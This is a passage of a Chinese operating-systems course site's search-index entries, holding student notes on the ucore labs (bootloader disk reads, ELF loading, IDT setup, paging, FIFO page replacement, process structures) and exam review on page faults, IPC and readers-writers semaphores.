cmd 0x20 - read sectors  // wait for disk to be ready  waitdisk(); // read a sector  insl(0x1F0, dst, SECTSIZE / 4); }  看文件前的注释可知，函数两个参数的含义：dst 是目标句柄，secno 是扇区标示； 根据参考资料，后面的几行是通过 24-bit LBA 的方式读取磁盘（下面进行详细解析）； 后面的 insl 函数则是读取四个字节到 dst 这个句柄中；  那么 outb 那几行的具体原理是什么呢，首先我们在 Linux manual 上找到了函数原型：\nvoid outb(unsigned char value, unsigned short int port); 它通过 port 这个 IO 技术与磁盘进行通信，这个技术被简称为 PIO。关于这个技术我找到一个中文的相关博客：网络 IO 与磁盘 IO 详解，其中是这样描述的：\n PIO：我们拿磁盘来说，很早以前，磁盘和内存之间的数据传输是需要 CPU 控制的，也就是说如果我们读取磁盘文件到内存中，数据要经过 CPU 存储转发，这种方式称为 PIO。显然这种方式非常不合理，需要占用大量的 CPU 时间来读取文件，造成文件访问时系统几乎停止响应。 DMA：后来，DMA（直接内存访问，Direct Memory Access）取代了 PIO，它可以不经过 CPU 而直接进行磁盘和内存的数据交换。在 DMA 模式下，CPU 只需要向 DMA 控制器下达指令，让 DMA 控制器来处理数据的传送即可，DMA 控制器通过系统总线来传输数据，传送完毕再通知 CPU，这样就在很大程度上降低了 CPU占有率，大大节省了系统资源，而它的传输速度与 PIO 的差异其实并不十分明显，因为这主要取决于慢速设备的速度。 可以肯定的是，PIO 模式的计算机我们现在已经很少见到了。  在 Stanford 的课件中，我们找到了 24-bit LBA 模式读取磁盘，有更完整注释的代码：\nIDE_ReadSector(int disk, int off, void *buf) { outb(0x1F6, disk == 0 ? 0xE0 : 0xF0); // Select Drive IDEWait(); outb(0x1F2, 512); // Read length (512 B) outb(0x1F3, off); // LBA Low outb(0x1F4, off \u0026gt;\u0026gt; 8); // LBA Mid outb(0x1F5, off \u0026gt;\u0026gt; 16); // LBA High outb(0x1F7, 0x20); // Read Command insw(0x1F0, buf, 256); // Read 256 Words } 问题二 #   Boot loader 是如何加载 ELF 格式的 OS？\n 略读代码发现，读取并解析 ELF 文件字节的是 bootmain 函数在进行的工作：\n/* bootmain - the entry of bootloader */ void bootmain(void) { // read the 1st page off disk  readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0); // is this a valid ELF?  if (ELFHDR-\u0026gt;e_magic != ELF_MAGIC) { goto bad; } struct proghdr *ph, *eph; // load each program segment (ignores ph flags)  ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-\u0026gt;e_phoff); eph = ph + ELFHDR-\u0026gt;e_phnum; for (; ph \u0026lt; eph; ph ++) { readseg(ph-\u0026gt;p_va \u0026amp; 0xFFFFFF, ph-\u0026gt;p_memsz, ph-\u0026gt;p_offset); } // call the entry point from the ELF header  // note: does not return  ((void (*)(void))(ELFHDR-\u0026gt;e_entry \u0026amp; 0xFFFFFF))(); bad: outw(0x8A00, 0x8A00); outw(0x8A00, 0x8E00); /* do nothing */ while (1); }  它首先将磁盘的第一页读取了进来，然后通过文件幻数检查它是否为一个合法的 ELF 文件； 程序循环性地调用 readseg 函数，通过 proghdr 结构的参数读取 ELF 文件的内容（此处涉及到 resadseg 函数的具体实现与 proghdr 的结构）； 然后程序调用 ELF 的入口函数；  在 Stack Overflow 上可以找到结构的具体实现（没什么特别的）：\nstruct Proghdr { uint32_t p_type; uint32_t p_offset; uint32_t p_va; uint32_t p_pa; uint32_t p_filesz; uint32_t p_memsz; uint32_t p_flags; uint32_t p_align; }; 而 readseg 函数具体实现就是同一个文件中：\n/* * * readseg - read @count bytes at @offset from kernel into virtual address @va, * might copy more than asked. * */ static void readseg(uintptr_t va, uint32_t count, uint32_t offset) { uintptr_t end_va = va + count; // round down to sector boundary  va -= offset % SECTSIZE; // translate from bytes to sectors; kernel starts at sector 1  uint32_t secno = (offset / SECTSIZE) + 1; // If this is too slow, we could read lots of sectors at a time.  // We\u0026#39;d write more to memory than asked, but it doesn\u0026#39;t matter --  // we load in increasing order.  for (; va \u0026lt; end_va; va += SECTSIZE, secno ++) { readsect((void *)va, secno); } } 逻辑也相当清晰，注释也很完整，这里就不解释了。\n"},{"id":150,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe5/","title":"Exe5","section":"lab1","content":"exe5 #  程序思路：函数kern/debug/kdebug.c::print_stackframe的注释写的很清楚了，先调用read_ebp(),read_eip()读出 ebp 和 eip 的指并打印出来。然后输出四个参数的值，由 ebp 开始向上找两位所保存的值是第一个参数，以此类推。然后找到下一个函数栈的 eip 和 ebp,下一个函数的 eip 就是压入栈的返回地址，也就是当前 ebp 向上找一位所保存的值，下一个函数的 ebp 就是当前 ebp 保存的地址所指向的地方。\n"},{"id":151,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe6/","title":"Exe6","section":"lab1","content":"exe6 #  写在前面： #  阅读源码时，发现了一个之前没有遇到过的 c 语言语法：\nstruct struct_name { unsigned field1: 16; unsigned field2: 16; }; 这个结构声明表示声明了一个名为 struct_name，同时有 field1、field2 这两个 16 位字段的结构。（同时发现 64 位计算器的结构大小一定是 4 个字节的整数倍，不足则向上 padding）\n问题一 #   中断描述表（保护模式下的中断向量表）中，一个表项占多少个字节？其中哪几位代表中断处理代码的入口？\n 中断描述表定义在 kern/trap/trap.c 这个文件中：\n/* * * Interrupt descriptor table: * * Must be built at run time because shifted function addresses can\u0026#39;t * be represented in relocation records. * */ static struct gatedesc idt[256] = {{0}}; 其中 gatedesc 这个结构定义在 kern/mm/mmu.h 这个文件中：\n/* Gate descriptors for interrupts and traps */ struct gatedesc { unsigned gd_off_15_0 : 16; // low 16 bits of offset in segment  unsigned gd_ss : 16; // segment selector  unsigned gd_args : 5; // # args, 0 for interrupt/trap gates  unsigned gd_rsv1 : 3; // reserved(should be zero I guess)  unsigned gd_type : 4; // type(STS_{TG,IG32,TG32})  unsigned gd_s : 1; // must be 0 (system)  unsigned gd_dpl : 2; // descriptor(meaning new) privilege level  unsigned gd_p : 1; // Present  unsigned gd_off_31_16 : 16; // high bits of offset in segment }; 计算之后可以发现这个结构一共占 64bits = 8bytes，也就是说表项占 8 个字节。\n决定处理代码入口的是逻辑地址，也就是段选择子与段偏移这两个字端，看名称与注释知道逻辑地址是 gd_off_15_0、gd_ss、gd_off_31_16 这三个字段决定的。也就是最开始的 32 位与最后的 16 位。\n问题二 #   请编程完善 kern/trap/trap.c 中对中断向量表进行初始化的函数 idt_init。在 idt_init 函数中，依次对所有中断入口进行初始化。使用 mmu.h 中的 SETGATE 宏，填充 idt 数组内容。\n每个中断的入口由 tools/vectors.c 生成，使用 trap.c 中声明的 vectors 数组即可。\n 首先我们简单翻译一下这个文件的注释：\n  所有的 ISR 入口地址都存储在 __vectors 这个变量中，而这个变量是由 tools/vector.c 这个文件生成 kern/trap/vector.S 这个汇编代码得来的。\n你可以在代码中引入下面这一行来声明这个外部变量：\nextern uintptr_t __vectors[];   接下来就可以使用 ISR 的入口初始化 IDT 了，也就是 kern/trap/trap.c 文件中的 idt 变量；\n  之后，你就需要用 lidt 这个指令告诉 CPU 中断向量表的地址了。\n  第二步中，设置需要用到 SETGATE 这个宏：\n/* * * Set up a normal interrupt/trap gate descriptor * - istrap: 1 for a trap (= exception) gate, 0 for an interrupt gate * - sel: Code segment selector for interrupt/trap handler * - off: Offset in code segment for interrupt/trap handler * - dpl: Descriptor Privilege Level - the privilege level required * for software to invoke this interrupt/trap gate explicitly * using an int instruction. * */ #define SETGATE(gate, istrap, sel, off, dpl) { \\ (gate).gd_off_15_0 = (uint32_t)(off) \u0026amp; 0xffff; \\ (gate).gd_ss = (sel); \\ (gate).gd_args = 0; \\ (gate).gd_rsv1 = 0; \\ (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32; \\ (gate).gd_s = 0; \\ (gate).gd_dpl = (dpl); \\ (gate).gd_p = 1; \\ (gate).gd_off_31_16 = (uint32_t)(off) \u0026gt;\u0026gt; 16; \\ } 简单的说呢，这个宏定义了五个参数：\n 第一个参数是中断描述符，就是前一个问题中 gatedesc 这个结构的对象； 第二个参数是一个布尔型变量，1 表示 Trap Gate，0 表示 Interrupt Gate； 第三个参数是段选择子；第四个参数是段偏移。这两个参数构成一个逻辑地址； 第五个参数是段描述符的优先级；  段选择子应该如何选择呢，在 kern/mm/memlayout.h 这个文件中有提到：\n/* global descriptor numbers */ #define GD_KTEXT ((SEG_KTEXT) \u0026lt;\u0026lt; 3) // kernel text #define GD_KDATA ((SEG_KDATA) \u0026lt;\u0026lt; 3) // kernel data #define GD_UTEXT ((SEG_UTEXT) \u0026lt;\u0026lt; 3) // user text #define GD_UDATA ((SEG_UDATA) \u0026lt;\u0026lt; 3) // user data #define GD_TSS ((SEG_TSS) \u0026lt;\u0026lt; 3) // task segment selector 也就是说，内核的代码段是 GD_KTEXT 这个宏。\n问题三 #   请编程完善 trap.c 中的中断处理函数 trap，在对时钟中断进行处理的部分填写 trap 函数中处理时钟中断的部分，使操作系统每遇到 100 次时钟中断后，调用 print_ticks 子程序，向屏幕上打印一行文字 \u0026ldquo;100 ticks”。\n 这个相当简单，我就不说了。\n"},{"id":152,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/personal_summary/","title":"Personal Summary","section":"lab1","content":"@石博：\n 遇到的首要问题就是读不懂 linux 命令与汇编，感谢 bing.com，为什么不感谢 google 呢，因为我翻不了墙啊，服务器太贵了租不起。然后就是读出来的 ebp 和 eip 值我当成了指针，直接当指针使用了，报错很清晰，改完程序就ok了，完结撒花。  @佘崧林：\n 熟悉了解了操作系统的底层中断机制 石博牛逼  "},{"id":153,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe0/","title":"Exe0","section":"lab2","content":"exe0 #  概述 #  首先我们看看 lab1 与 lab2 的代码有什么不同：\n  在 ucore_os_lab 这个项目中添加不同的 repo，用以回滚到最原始的版本：\n$ git remote -v origin\thttps://github.com/chyyuu/ucore_os_lab.git (fetch) origin\thttps://github.com/chyyuu/ucore_os_lab.git (push) $ git remote add upstream https://github.com/chyyuu/ucore_os_lab $ git remote -v origin\thttps://github.com/chyyuu/ucore_os_lab.git (fetch) origin\thttps://github.com/chyyuu/ucore_os_lab.git (push) upstream\thttps://github.com/chyyuu/ucore_os_lab (fetch) upstream\thttps://github.com/chyyuu/ucore_os_lab (push)   拉取主仓中最新的代码，并且切换到远程的 master 分支：\n$ git pull upstream master From https://github.com/chyyuu/ucore_os_lab * branch master -\u0026gt; FETCH_HEAD * [new branch] master -\u0026gt; upstream/master Already up to date. $ git checkout upstream/master   然后我们使用 diff 命令查看 lab1 与 lab2 的代码差异：\n$ diff -rq labcodes/lab1 labcodes/lab2 ... 这个命令有大量的回显，所以这两个子文件夹是不一样的。\n  解决方案 #  我需要满足这样一些条件的解决方案：\n 显然我们并不想手动进行更改； 我们并不想使用图形化工具； 我们也并不想，逐个找我们更改了哪些文件，然后通过某种方式 “一键更改”，这种解决方案虽然比第一种简单一些，听起来仍然很愚蠢。  我们首先明白我们要做的是一件什么样的事情，我画了一个流程图：\n +-------------+ +------------| lab1:legacy | | +------|------+ | | | | change1: fileA, fileB | | | | change2: fileC, fileD | | | | | | v v +-----------+ +-----------+ | lab2:HEAD | | lab1:HEAD | +-----|-----+ +-----|-----+ | | | merge | |\u0026lt;------------------+ | | change3: fileA, fileB, fileC, fileD | v +-------------+ | lab2:target | +-------------+ 简单的说，我们要做的事情是通过 change1 与 change2 得到 change3。\n如果这是分支开发，那事情就会很简单，直接使用 git merge 或者 git stash push/apply 即可。但是我们工作在两个不同的文件夹下，我们有以下的思路：\n 通过 git diff 命令，将 chang2 导出； 通过 sed 命令，将 lab1 替换为 lab2 导入到文件中； 通过 git apply 命令将补丁文件 apply 到 lab2:HEAD 上。  实现 #  我们首先找到本仓库引入原始 labcodes 的 commit：ed036f7b95e0a968ea2e14537b7eecfc20291ce7：\n  导出 change2：\n$ git diff ed036f7b95e0a968ea2e14537b7eecfc20291ce7 HEAD labcodes/lab1/ | sed \u0026#39;s/lab1/lab2/g\u0026#39; \u0026gt; lab2/exe0.patch   进行 merge：\n$ git apply lab2/exe0.patch   "},{"id":154,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/exe2/","title":"Exe2","section":"lab2","content":"exe2 #  概述 #   通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。其中的 get_pte 函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项 的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。\n本练习需要补全kern/mm/pmm.c 文件中的 get_pte 函数，实现其功能。请仔细查看和理解 get_pte 函数中的注释。\n 函数原型如下：\npte_t *get_pte(pde_t *pgdir, uintptr_t la, bool create); 我们先来翻译一下这个函数的注释：\n函数 get_pte 的相关注释：\n 作用：通过页目录项和逻辑地址，取得对应的页表；如果页表不存在则会分配这个页表； 参数：pgdir：页目录项；la：逻辑地址；create：是否创建新的页表； 返回值：内核对应页表的虚拟地址。  在对应的头文件 pmm.h 与 mmu.h 中，定义了一些你可能会用到宏和函数：\n PDX(la)：通过一个进程的虚拟逻辑地址，求得一个页目录项的索引； PTX(la)：通过一个进程的虚拟逻辑地址，求得一个页表项的索引； KADDR(pa)：通过一个物理地址，返回一个对应的内核虚拟地址； set_page_ref(page, 1)：将页的引用计数加一； page2pa(page)：通过一个页表项，得到它实际的物理地址； struct Page * alloc_page()：分配一个内存页； memset(void *s, char c, size_t n)：将指针 s 之后的 n 个区域的内容设置为 c； PTE_P：存在；PTE_W：写；PTE_U：读。  问题一 #   请描述页目录项 (Page Directory Entry) 和页表 (Page Table Entry) 中每个组成部分的含义和以及对 ucore 而言的潜在用处。\n 因为页目录项、页表、物理地址对应的起始地址都要求按照 4096 比特对齐。因此：\n  页目录项的高 20 位用于存储页表的实际物理地址；\n页表项的高 20 位用于存储虚拟地址对应的真实物理地址；\n  页目录项和页表项的低 12 位都用于存储一些标志位，详细的内容列举在了 ./kern/mm/mmu.h 这个文件中。\n  问题二 #   如果 ucore 执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？\n 进行换页操作：\n 首先 CPU 将产生页访问异常的线性地址放到 cr2 寄存器中 然后就是和普通的中断一样保护现场，将寄存器的值压入栈中，然后压入 error_code 中断服务例程将外存的数据换到内存中来 最后退出中断，回到进入中断前的状态  代码 #  "},{"id":155,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe0/","title":"Exe0","section":"lab3","content":"exe0 #  同 lab2：\n  导出 change：\n$ git diff 7ca90137c09c54f5afa9b87a35a68d9f65ecef52 HEAD labcodes/lab2/ | sed \u0026#39;s/lab2/lab3/g\u0026#39; \u0026gt; lab3/exe0.patch   进行 merge：\n$ git apply lab3/exe0.patch   "},{"id":156,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe1/","title":"Exe1","section":"lab3","content":"如果ucore的缺页服务例程在执行过程中访问内存,出现了页访问异常,请问硬件要做哪 些事情?\n将产生页访问异常的线性地址存入 cr2 寄存器中 并且给出 错误码 error_code 说明是页访问异常的具体原因\nerror_code : the error code recorded in trapframe-\u0026gt;tf_err which is setted by x86 hardware\n将其 存入 trapframe 中 tf_err 等到中断服务例程 调用页访问异常处理函数do_pgfault() 时 再判断 具体原因 若不在某个VMA的地址范围内 或 不满足正确的读写权限 则是非法访问 若在此范围 且 权限也正确 则 认为是 合法访问 只是没有建立虚实对应关系 应分配一页 并修改页表 完成 虚拟地址到 物理地址的映射 刷新 TLB.重新执行引发页访问异常的 那条指令.\n"},{"id":157,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe2/","title":"Exe2","section":"lab3","content":"exe2 #  代码 #  _fifo_map_swappable #  FIFA 算法需要将最近使用过的页链接在链表的头部。\n看注释，这个函数是要将刚刚使用过的 page 放在链表的第二个元素。程序已经将链表和元素都选取出来了：\nlist_entry_t *head=(list_entry_t*) mm-\u0026gt;sm_priv; list_entry_t *entry=\u0026amp;(page-\u0026gt;pra_page_link); 因此我们只需要调用 list_entry_t 中的方法即可：\nlist_add(head, entry); _fifo_swap_out_victim #  FIFA 算法需要将最长时间未使用过的页从链表的尾部去除。\n看注释我们需要做的事情是删除尾部，并且用 ptr_page 这个参数指向被替换的页：\nstatic int _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, int in_tick) { list_entry_t *head=(list_entry_t*) mm-\u0026gt;sm_priv; assert(head != NULL \u0026amp;\u0026amp; in_tick==0); list_entry_t *tail = head-\u0026gt;prev; // Select the victim  assert(tail != head); // this isn\u0026#39;t a one-element-list  *ptr_page = le2page(tail, pra_page_link); // (2) assign the value of *ptr_page to the addr of this page  list_del(tail); // (1) unlink the earliest arrival page in front of pra_list_head qeueue  assert(*ptr_page != NULL); return 0; } do_pgfault #  惯例先翻译注释：\n 经过 exe1 的流程，我们可以认为变量 ptep 是一个待替换的页表项。 现在我们需要把这个页表项对应磁盘中的内容加载到内存中来，然后将逻辑地址映射到这个页表项中，同时触发之前更改的 FIFO 的页表替换逻辑。  问题 #   如果要在ucore上实现\u0026quot;extended clock页替换算法\u0026quot;请给你的设计方案，现有的 swap_manager框架是否足以支持在ucore中实现此算法?如果是，请给你的设计方案。 如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题：\n  需要被换出的页的特征是什么?\n 访问标志位和修改标志位都为 0 时；\n 在 ucore 中如何判断具有这样特征的页?\n 访问标志位：PTE_A；修改标志位：PTE_D；\n 何时进行换入和换出操作?\n 换入是在缺页异常的时候，换出是在物理页帧满的时候\n"},{"id":158,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe0/","title":"Exe0","section":"lab4","content":"exe0 #  同 lab2：\n  导出 change：\n$ git diff 776bc9ece6f0f887962603c0eadf779d1443ecbd HEAD labcodes/lab3/ | sed \u0026#39;s/lab3/lab4/g\u0026#39; \u0026gt; lab4/exe0.patch   进行 merge：\n$ git apply lab4/exe0.patch   "},{"id":159,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe1/","title":"Exe1","section":"lab4","content":"exe1 #  代码 #   alloc_proc 函数（位于 kern/process/proc.c 中）负责分配并返回一个新的 struct proc_struct 结构，用于存储新建立的内核线程的管理信息。ucore 需要对这个结构进行最基本的初始化，你需要完成这个初始化过程。\n 问题 #   请说明 proc_struct 中 struct context context 和 struct trapframe *tf 成员变量含义和在本实验中的作用是啥？（提示通过看代码和编程调试可以判断出来）\n Context：声明\nstruct context { uint32_t eip; uint32_t esp; uint32_t ebx; uint32_t ecx; uint32_t edx; uint32_t esi; uint32_t edi; uint32_t ebp; };  在进程切换时，用于保存进程运行状态的寄存器的值的变量；  Trapeframe：声明：\nstruct trapframe { struct pushregs tf_regs; uint16_t tf_gs; uint16_t tf_padding0; uint16_t tf_fs; uint16_t tf_padding1; uint16_t tf_es; uint16_t tf_padding2; uint16_t tf_ds; uint16_t tf_padding3; uint32_t tf_trapno; /* below here defined by x86 hardware */ uint32_t tf_err; uintptr_t tf_eip; uint16_t tf_cs; uint16_t tf_padding4; uint32_t tf_eflags; /* below here only when crossing rings, such as from user to kernel */ uintptr_t tf_esp; uint16_t tf_ss; uint16_t tf_padding5; } __attribute__((packed));  发生中断时，保存现场；  "},{"id":160,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%BC%82%E5%B8%B8/","title":"中断与异常","section":"实验项目组成","content":"中断与异常 #  简述 #  中断引入的目的：\n CPU 需要与外设进行交流。 因为 CPU 与外设存在显著的速度差异，如果使用轮询的方式则太浪费 CPU 资源了。 引入中断机制解决了上面两个问题，但是导致操作系统的理解更加困难。  在操作系统中，有三种特殊的中断事件：\n 由 CPU 外部设备引起的外部事件，简称中断 (interrupt)  比如：IO 中断、时钟中断、控制台中断。 因为它的产生与 CPU 的执行无关，我们也称它为异步中断。   把在 CPU 执行指令期间检测到不正常或非法的条件所引起的内部事件称作异常 (exception)  比如：除零错误、地址访问越界。 这类 CPU 内部事件导致的称谓同步中断，也称哪部中断   在程序中使用请求系统服务而引发，称作陷入中断 (trap interrupt)、也称软中断、系统调用。  处理中断的的流程大致如下：\n CPU 收到中断 (8259A) 或者异常的事件时，它会暂定执行当前的程序或任务； CPU 通过 IDT（Interrupt Descriptor Table，存储着中断向量与中断服务例程的对应关系）查询处理中断的例程，IDT 是中断处理的核心结构； 执行例程完成后跳回被打断的程序。  中断描述符表 IDT #  IDT 中的中断描述符可以分为三种：\n Task Gate、Interrupt Gate、Trap Gate  下面是这三种中断描述符的结构：\n实验中使用到的是后两种结构，他们的实现有着一点微小的区别：\n CPU 跳转到 Interrupt Gate 里的地址时，在将 EFLAGS 保存到栈上之后，清除 EFLAGS 里的 IF 位，以避免重复触发中断。 用户进程在正常执行中是不能禁止中断的，也就是说 Trap Gate 不会清除 IF 位。  "},{"id":161,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%88%86%E6%AE%B5%E6%A8%A1%E5%BC%8F/","title":"保护模式与分段模式","section":"实验项目组成","content":"保护模式与分段模式 #  简介 #  为什么要有保护模式？\n Intel 80386 只有在保护模式下，才可以提供更好的保护机制和更大的寻址空间； 没有保护机制，任何应用软件都可以任意地访问所有计算机资源； 许多操作系统功能（比如分页）都是建立在保护模式上设计的；  实模式 #  bootloader 在 BIOS 之后开始运行时，PC 处于 16 位实模式运行状态。\n它主要有以下特点：\n  实模式下，上层软件可以访问的物理内存空间不超过 1MB；\n  实模式将整个物理内存看成分段的区域，每一个指针都是指向实际的物理内存。\n  通过修改 A20 地址线可以完成从实模式到保护模式的切换。\n  保护模式 #  概念 #  GDT 与 LDT：\n 保护模式下，有两个段表：GDT（Global Descriptor Table）和 LDT（Local Descriptor Table）  段描述符：GDT 表的内容；\n 为了兼容各个不同版本的 CPU，它的形式比较复杂； 它最重要的字段是 segment base 与 segment limit； 也称之为段，此处的段与 ELF 源程序中的 .text、.data 等概念中的段，是相同的。  段选择子：16 bits，GDT 表的索引；\n [0:2] 是表格的优先级 (00 最高，11 最低)，[2:3] 是表格的类型 (0 为 GDT)，[3:16] 是 GDT 的索引；  介绍 #  保护模式有以下特点：\n 80386 的 32 根地址线全部有效； 上层软件可以寻址高达 4G 字节的地址空间，可访问 64TB 的逻辑地址空间； 采用了分段存储管理机制 和 分页存储管理机制。  分段存储管理机，逻辑地址（由段选择子 selector 与段偏移 offset 组成）到物理地址转换会通过以下的两个步骤：\n  第一步是从逻辑地址得到一个线性地址：\n线性地址 = 段描述符表[段选择子[15:3] ] + 段偏移   如果未开启分页地址转换，则线性地址即为物理地址；否则需要由操作系统进一步处理。\n  "},{"id":162,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E5%88%86%E9%A1%B5%E6%8A%80%E6%9C%AF/","title":"分页技术","section":"实验项目组成","content":" 参考：\n https://stackoverflow.com/questions/29945171/difference-between-page-table-and-page-directory   分页技术 #  设计 #  下面一张图可以展示分页技术的层级设计过程：\n概念 #  页 (Page)：\n 在进程的逻辑地址中，一段连续地址的集合。 页的大小一般提供三种规格：4K、2M、4M  Frame：\n 在内存的物理地址中，一段连续地址的集合。 一个 Page 与一个对应的 Frame 对应，Frame 的大小与 Page 也是相同的。  页表 (Page Table) 与页目录 (Page Directory)：\n  页表：是一个有 1024 个 32-bit 元素的列表，每一个元素都指向一个真实的物理地址；\n如果页表大小为 4K，我们只能表示 1024 * 4K = 2^22，22-bit 的逻辑地址。而我们需要 4G = 32-bit 的逻辑地址。因此如果只有一个页表，我们无法表示整个逻辑地址空间。\n  页目录：因为页表无法映射所有逻辑地址而产生的二级目录，它也是一个有 1024 个 32-bit 元素的列表，每一个元素都指向一个页表的地址；\n页表和页目录项一起工作，我们即可以映射整个 4G = 32-bit 的逻辑地址。\n  流程 #  "},{"id":163,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"期末复习","section":"操作系统","content":"期末复习 #  概念 #  快表，TLB（Translation Look-aside Buffer）：\n反置页表\n缺页中断 #  缺页中断的处理流程：\n 在内存中有空闲物理页面时，分配一物理页帧 f，转第 5 步； 依据 页面置换算法 选择将被替换的物理页帧 f，对应逻辑页 q； 如果 q 被修改过，则把它写回外存； 修改 q 的页表项中驻留位置为 0； 将需要访问的页 p 装入到物理页面 f； 修改 p 的页表项驻留位为 1，物理页帧号为 f； 重新执行产生缺页的指令；  进程间通信 #  进程间通信（InterProcess Communication）有哪些方式？\n信号：信号是 Linux 系统中用于进程之间通信或操作的一种机制\n  信号可以在任何时候发送给某一进程，而无须知道该进程的状态。\n  如果该进程并未处于执行状态，则该信号就由内核保存起来，知道该进程恢复执行并传递给他为止。\n  如果一个信号被进程设置为阻塞，则该信号的传递被延迟，直到其阻塞被取消时才被传递给进程。\n  管道：管道是 Linux 支持的最初 Unix IPC 形式之一\n  管道是半双工的，数据只能向一个方向流动；需要双方通信时，需要建立起两个管道；\n  匿名管道只能用于父子进程或者兄弟进程之间（具有亲缘关系的进程）；\n在 C 语言代码中，可以直接调用 pipe 函数：\nint pipe_fd[2]; assert(pipe(pipe_fd) \u0026gt;= 0);   命名管道有一个名字，命名管道的名字对应于一个磁盘索引节点，有了这个文件名，任何进程有相应的权限都可以对它进行访问。\n在 shell 中，使用如下两条命令创建是等价的：\n$ mkfifo myfifo $ mknod myfifo p   单独构成一种独立的文件系统：管道对于管道两端的进程而言，就是一个文件，但它不是普通的文件，它不属于某种文件系统，而是自立门户，单独构成一种文件系统，并且只存在与内存中。\n  消息队列：一系列保存在内核中消息的列表。用户进程可以向消息队列添加消息，也可以向消息队列读取消息。\n  消息队列与管道通信相比，其优势是对每个消息指定特定的消息类型，接收的时候不需要按照队列次序，而是可以根据自定义条件接收特定类型的消息。\n  可以把消息看做一个记录，具有特定的格式以及特定的优先级。对消息队列有写权限的进程可以向消息队列中按照一定的规则添加新消息，对消息队列有读权限的进程可以从消息队列中读取消息。\n  共享内存：共享内存允许两个或多个进程共享一个给定的存储区\n  这一段存储区可以被两个或两个以上的进程映射至自身的地址空间中，一个进程写入共享内存的信息，可以被其他使用这个共享内存的进程，通过一个简单的内存读取错做读出，从而实现了进程间的通信。\n  采用共享内存进行通信的一个主要好处是效率高，因为进程可以直接读写内存，而不需要任何数据的拷贝，对于像管道和消息队里等通信方式，则需要再内核和用户空间进行四次的数据拷贝，而共享内存则只拷贝两次：一次从输入文件到共享内存区，另一次从共享内存到输出文件。\n  IPC 问题 #  有哪些 IPC 问题？\n  生产者消费者问题；\n  读者写者问题：读读不互斥、读写互斥、写写互斥；\n  读者优先解决方案。一些变量的定义如下：\ntypedef int mutex; int reader_amount = 0; mutex writer_exclusive = 1, amount_exclusive = 1; extern void P(mutex \u0026amp;); extern void V(mutex \u0026amp;); 读者和写者的代码如下：\nvoid read () { P(amount_exclusive); if (reader_amount++ == 0) P(writer_exclusive); V(amount_exclusive); do_read(); P(amount_exclusive); if (--reader_amount == 0) V(writer_exclusive); V(amount_exclusive); } void write () { P(writer_exclusive); do_write(); V(writer_exclusive); }   公平解决方案（没有任何一个在写者之后到来的读者，会先于它执行）。一些变量的定义如下：\ntypedef int mutex; int reader_amount = 0, writer_amount = 0; mutex ramount_exclusive = 1, wamount_exclusive = 1; mutex fairness = 1, writer_exclusive = 1; extern void P(mutex \u0026amp;); extern void V(mutex \u0026amp;); 读者和写者的代码如下：\nvoid read () { P(fairness); P(ramount_exclusive); if (reader_amount++ == 0) P(writer_exclusive); V(ramount_exclusive); V(fairness); do_read(); P(ramount_exclusive); if (--reader_amount == 0) V(writer_exclusive); V(ramount_exclusive); } void write () { P(wamount_exclusive); if (writer_amount++ == 0) P(fairness); V(wamount_exclusive); P(writer_exclusive); do_write(); V(writer_exclusive); P(wamount_exclusive); if (--writer_amount == 0) V(fairness); V(wamount_exclusive); }      沉睡的理发师问题；\n  